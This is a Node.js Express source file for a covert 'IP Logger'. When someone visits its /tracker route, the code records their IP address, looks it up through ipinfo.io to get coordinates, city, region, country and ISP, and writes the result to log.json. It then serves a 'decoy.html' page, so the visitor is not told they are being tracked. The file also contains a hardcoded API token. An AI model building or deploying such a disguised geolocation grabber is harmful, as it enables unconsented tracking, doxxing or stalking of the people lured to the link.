const express = require('express');
const axios = require('axios');
const fs = require('fs');
const app = express();
const port = 3000;

// IP Logger Route
app.get('/tracker', async (req, res) => {
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

    // Get geolocation data
    const geoApi = `https://ipinfo.io/${ip}/json?token=5ffc02d61128c5`;
    try {
        const response = await axios.get(geoApi);
        const data = {
            ip: ip,
            location: response.data.loc,
            city: response.data.city,
            region: response.data.region,
            country: response.data.country,
            org: response.data.org,
            time: new Date().toISOString(),
        };

        // Save to file (log.json)
        fs.appendFileSync('log.json', JSON.stringify(data) + '\n');
        console.log('Logged:', data);

        // Send decoy HTML
        res.sendFile(__dirname + '/decoy.html');
    } catch (error) {
        console.error('Error fetching geolocation:', error);
        res.status(500).send('Something went wrong.');
    }
});

// Serve decoy page
app.use(express.static('public'));

app.listen(port, () => {
    console.log(`Server running on http://localhost:${port}`);
});
